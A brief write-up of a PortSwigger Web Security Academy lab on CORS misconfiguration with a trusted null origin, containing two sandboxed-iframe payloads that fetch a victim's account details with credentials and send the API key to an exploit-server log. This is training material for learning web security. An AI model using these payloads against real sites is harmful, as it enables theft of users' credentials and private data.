write up:
    first, try detect the web
    see how api shows => through /accountDetails
    => try to by pass this 
    => after try add many origin in GET /accountDetails
    => Mistakes often arise when implementing CORS origin whitelists. 
    => Some organizations decide to allow access from all their subdomains (including future subdomains not yet in existence).
    => try null origin=> success => we can write payload through iframe
    => because sandbox attribute is set, the content is treated as being from a unique origin
    => we can try iframe sandbox
    => read https://stackoverflow.com/questions/35208161/is-it-safe-to-have-sandbox-allow-scripts-allow-popups-allow-same-origin-on-if
our payload:
<iframe sandbox="allow-scripts" srcdoc="
    <script>
    var req = new XMLHttpRequest();
    var url = 'https://0a23006c036e1ad8c3fa283f008c00b4.web-security-academy.net';
    var urlExploit = 'https://exploit-0ad5001f035a1a8ec38627f301cd0021.exploit-server.net';
    req.onload = function() {
        location = urlExploit + '/log/?apikey=' + this.responseText;
    };
    req.open('GET',url+'/accountDetails',true);
    req.withCredentials = true;
    req.send();
</script>"></iframe>


    example in portswigger : 
    <iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
        var req = new XMLHttpRequest();
        req.onload = reqListener;
        req.open('get','https://0a23006c036e1ad8c3fa283f008c00b4.web-security-academy.net/accountDetails',true);
        req.withCredentials = true;
        req.send();
        function reqListener() {
            location='https://exploit-0ad5001f035a1a8ec38627f301cd0021.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
        };
    </script>"></iframe>
